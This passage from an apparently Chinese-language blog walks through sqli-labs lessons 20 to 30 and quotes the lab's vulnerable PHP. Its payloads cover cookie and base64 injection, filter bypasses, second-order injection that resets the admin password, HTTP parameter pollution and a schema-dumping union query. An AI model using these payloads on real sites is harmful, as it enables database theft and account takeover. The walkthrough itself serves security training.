<p>这次是Referer</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; AND updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">AND</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172329237.png" srcset="/img/loading.gif" lazyload alt="image-20210120172329237"></p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172315386.png" srcset="/img/loading.gif" lazyload alt="image-20210120172315386"></p>
<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172523016.png" srcset="/img/loading.gif" lazyload alt="image-20210120172523016"></p>
<p>估计这回要改cookie了</p>
<p>源码这样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<br>.......<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>设置一个名为 uname的cookie</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hello</span>&#x27; AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120175110298.png" srcset="/img/loading.gif" lazyload alt="image-20210120175110298"></p>
<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>还是cookie，但是更复杂了</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120175622603.png" srcset="/img/loading.gif" lazyload alt="image-20210120175622603"></p>
<p>看来被base64了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<br><span class="hljs-variable">$cookee</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cookee</span>);<br>......<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>



<p>对payload进行base64编码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hello</span>&#x27; AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure>

<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">aG<span class="hljs-attr">VsbG8</span><span class="hljs-symbol">nIEFORCB1</span>cGRhdGV<span class="hljs-number">4</span>bWwoMSxjb<span class="hljs-number">25</span>jYXQoMH<span class="hljs-name">g3</span>ZSwoc<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>IHVzZXIoKSksMH<span class="hljs-name">g3</span>ZSksMSkj<br></code></pre></td></tr></table></figure>

<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>双引号</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&quot; AND updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure>

<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">IiBBTkQgdXBkYXRle<span class="hljs-name">G1</span>sKDEsY<span class="hljs-number">29</span>uY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>KDB<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>UsKH<span class="hljs-symbol">NlbGVjdCB1</span>c<span class="hljs-number">2</span>VyKCkpLDB<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>UpLDEpIw<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120182606166.png" srcset="/img/loading.gif" lazyload alt="image-20210120182606166"></p>
<h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>熟悉的一个注入点</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120182914559.png" srcset="/img/loading.gif" lazyload alt="image-20210120182914559"></p>
<p>双引号不会报错，单引号会报错</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120183734895.png" srcset="/img/loading.gif" lazyload alt="image-20210120183734895"></p>
<p>加个注释，还是报错</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120183805290.png" srcset="/img/loading.gif" lazyload alt="image-20210120183805290"></p>
<p>而且显示，我加的注释#消失了，估计是replace了</p>
<p>换其他的试试看–+ 也不行</p>
<p>那索性就不要注释了，直接用’闭合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;or+1=1+or&#x27;</span>1<br></code></pre></td></tr></table></figure>

<p>试试看报错注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;AND<span class="hljs-variable">%20</span>updatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">0x7e</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%20</span>user())<span class="hljs-punctuation">,</span><span class="hljs-number">0x7e</span>)<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)+<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120184711508.png" srcset="/img/loading.gif" lazyload alt="image-20210120184711508"></p>
<h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120184852156.png" srcset="/img/loading.gif" lazyload alt="image-20210120184852156"></p>
<p>哇，看来是新题型</p>
<p>注册了个hello，密码也是hello，然后登陆了进去</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120185034544.png" srcset="/img/loading.gif" lazyload alt="image-20210120185034544"></p>
<p>登录后，唯一能做的就是改密码</p>
<p>改密码的时候抓包，估计Auth就是用来辨别身份的</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120191401981.png" srcset="/img/loading.gif" lazyload alt="image-20210120191401981"></p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120191449447.png" srcset="/img/loading.gif" lazyload alt="image-20210120191449447"></p>
<p>成功</p>
<p>后端修改密码的代码会是怎么样呢</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>可见username直接参与到了sql语句里面</p>
<p>那就注册一个 <code>admin&#39;#</code> ，然后修改密码，就可以把admin的密码给改掉了</p>
<p>注册的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span>=  <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;<br></code></pre></td></tr></table></figure>

<p>刚好进行了转义，这样就可以顺利存储admin’#账号了</p>
<p>密码是hello</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195356111.png" srcset="/img/loading.gif" lazyload alt="image-20210120195356111"></p>
<p> 接下来进入修改密码的环节</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195644463.png" srcset="/img/loading.gif" lazyload alt="image-20210120195644463"></p>
<p>现在，damin的密码就是h了</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195811358.png" srcset="/img/loading.gif" lazyload alt="image-20210120195811358"></p>
<p>成功</p>
<h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195858667.png" srcset="/img/loading.gif" lazyload alt="image-20210120195858667"></p>
<p>提示不能用and 和 or</p>
<p>还会打印过滤后的字符串</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200020279.png" srcset="/img/loading.gif" lazyload alt="image-20210120200020279"></p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>不能and和or好像也不是很重要</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200254725.png" srcset="/img/loading.gif" lazyload alt="image-20210120200254725"></p>
<p>但是我的order 被过滤了</p>
<p>不过无妨</p>
<p>columns num 为3</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200348685.png" srcset="/img/loading.gif" lazyload alt="image-20210120200348685"></p>
<p>该干嘛干嘛</p>
<p>报错注入照常用</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200641510.png" srcset="/img/loading.gif" lazyload alt="image-20210120200641510"></p>
<h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200827069.png" srcset="/img/loading.gif" lazyload alt="image-20210120200827069"></p>
<p>没有空格和comments了？？</p>
<p>那就用单引号闭合了，但是看样子or和and都一样被过滤了</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120201610071.png" srcset="/img/loading.gif" lazyload alt="image-20210120201610071"></p>
<p>但是，or和and的过滤是可以绕过的，可以用 || 来代替 or ，用 &amp;&amp; 来代替 and</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;||(1=1)||&#x27;</span><br></code></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120202418342.png" srcset="/img/loading.gif" lazyload alt="image-20210120202418342"></p>
<p>用报错注入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,user(),0x7e))||&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120203759673.png" srcset="/img/loading.gif" lazyload alt="image-20210120203759673"></p>
<p>但是当我想用information_schema的时候，却发现or被过滤了</p>
<p>好像就到此为止了</p>
<h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120205719179.png" srcset="/img/loading.gif" lazyload alt="image-20210120205719179"></p>
<p>这次是union和select不能用</p>
<p>过滤了#，空格，好在这次or没有过滤</p>
<p>空格可以用特殊字符来绕过<code>%0a</code></p>
<p>union select 真弄的死死的可能性不大，试试看，最后发现可以大小写绕过</p>
<p>报错注入，yyds</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120210451232.png" srcset="/img/loading.gif" lazyload alt="image-20210120210451232"></p>
<p>大小写成功绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;||updatexml(1,concat(0x7e,(seLect/%0auser()),0x7e),1)||&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120210718815.png" srcset="/img/loading.gif" lazyload alt="image-20210120210718815"></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;||updatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">0x7e</span><span class="hljs-punctuation">,</span>(updatexml(rand()<span class="hljs-punctuation">,</span>concat(<span class="hljs-number">0x3a</span><span class="hljs-punctuation">,</span>(SELeCT<span class="hljs-variable">%0</span>aconcat(CHAR(<span class="hljs-number">126</span>)<span class="hljs-punctuation">,</span>group_concat(TABLE_NAME)<span class="hljs-punctuation">,</span>CHAR(<span class="hljs-number">126</span>))<span class="hljs-variable">%0</span>aFROM<span class="hljs-variable">%0</span>ainformation_schema.TABLES<span class="hljs-variable">%0</span>aWHERE<span class="hljs-variable">%0</span>atable_schema<span class="hljs-operator">=</span>database()))<span class="hljs-punctuation">,</span><span class="hljs-keyword">null</span>))<span class="hljs-punctuation">,</span><span class="hljs-number">0x7e</span>)<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)||&#x27;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212017879.png" srcset="/img/loading.gif" lazyload alt="image-20210120212017879"></p>
<h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212108358.png" srcset="/img/loading.gif" lazyload alt="image-20210120212108358"></p>
<p>加强了</p>
<p>一样过滤了#</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=2<span class="hljs-string">&#x27;and(1=1)and&#x27;</span>1<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213657517.png" srcset="/img/loading.gif" lazyload alt="image-20210120213657517"></p>
<p>可见仅仅是单引号不足以闭合</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213826992.png" srcset="/img/loading.gif" lazyload alt="image-20210120213826992"></p>
<p>但是单引号会引起报错，所以肯定有括号没有闭合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=2<span class="hljs-string">&#x27;)and(1=1)and(&#x27;</span>1<br></code></pre></td></tr></table></figure>

<p>经过尝试，前后都有括号，补上</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213932996.png" srcset="/img/loading.gif" lazyload alt="image-20210120213932996"></p>
<p>union和select单独并未被过滤，看来是 <code>union select</code> 被过滤了，而且忽略大小写</p>
<p>双写绕过</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">unionunion<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212635661.png" srcset="/img/loading.gif" lazyload alt="image-20210120212635661"></p>
<p>没有报错回显，所以没法报错注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&#x27;)unionunion<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%09</span><span class="hljs-keyword">select</span>(<span class="hljs-number">1</span>)<span class="hljs-punctuation">,</span>(database())<span class="hljs-punctuation">,</span><span class="hljs-number">1</span><span class="hljs-variable">%09</span><span class="hljs-keyword">and</span>(&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120214205371.png" srcset="/img/loading.gif" lazyload alt="image-20210120214205371"></p>
<p>可见，即使没法用注释，一样可以union select 注入</p>
<h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120214332256.png" srcset="/img/loading.gif" lazyload alt="image-20210120214332256"></p>
<p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>union select </p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120215925076.png" srcset="/img/loading.gif" lazyload alt="image-20210120215925076"></p>
<p>使用超级payload</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120220051754.png" srcset="/img/loading.gif" lazyload alt="image-20210120220051754"></p>
<p>怀疑根本就没有任何防御</p>
<p>实际上，主角不是这个index.php</p>
<p>而是login.php</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120220604740.png" srcset="/img/loading.gif" lazyload alt="image-20210120220604740"></p>
<p>是关于java和tomcat的</p>
<p>试试看闭合，尝试?id&#x3D;1’结果是跳转到hacked.php页面，尝试id&#x3D;1’%23结果还是跳转到hacked.php页面，尝试?id&#x3D;1’)%23和?id&#x3D;1’))%23，都是一样的，跳转到hacked.php页面</p>
<p>没辙了，分析一波源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id1</span>=<span class="hljs-title function_ invoke__">java_implimentation</span>(<span class="hljs-variable">$qs</span>);<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;<br>	<span class="hljs-variable">$qs_array</span>= <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);<br><br><br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>	&#123;<br>		<span class="hljs-variable">$val</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)<br>		&#123;<br>			<span class="hljs-variable">$id_value</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); <br>			<span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可见 $id1 的值是query_string中第一个名为id的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">whitelist</span>(<span class="hljs-variable">$id1</span>);<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-variable">$match</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$match</span>)<br>	&#123;<br>		<span class="hljs-comment">//echo &quot;you are good&quot;;</span><br>		<span class="hljs-comment">//return $match;</span><br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;	<br>		<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br>		<span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可见 $id1 只能全是数字，否则就会跳转到hacked.php</p>
<p>而最终参与sql语句的是 $id</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>提示有两个pdf</p>
<p><a target="_blank" rel="noopener" href="https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf">https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://community.qualys.com/servlet/JiveServlet/download/38-10665/Protocol-Level%20Evasion%20of%20Web%20Application%20Firewalls%20v1.1%20(18%20July%202012).pdf">https://community.qualys.com/servlet/JiveServlet/download/38-10665/Protocol-Level%20Evasion%20of%20Web%20Application%20Firewalls%20v1.1%20(18%20July%202012).pdf</a></p>
<p>里面有需要的知识点</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120222527706.png" srcset="/img/loading.gif" lazyload alt="image-20210120222527706"></p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120222447856.png" srcset="/img/loading.gif" lazyload alt="image-20210120222447856"></p>
<p>可见 对待多个相同名字的不同参数，不同的HTTP back-ends 有不同的处理方式</p>
<p>其中，php是取最后出现的那个为实际使用参数</p>
<p>所以，答案就显而易见了</p>
<p>使用超级payload</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223001087.png" srcset="/img/loading.gif" lazyload alt="image-20210120223001087"></p>
<h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>login.php才是主角</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223430630.png" srcset="/img/loading.gif" lazyload alt="image-20210120223430630"></p>
<p>直接分析源码了</p>
<p>换汤不换药，这次是双引号</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&amp;id=0&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223714110.png" srcset="/img/loading.gif" lazyload alt="image-20210120223714110"></p>
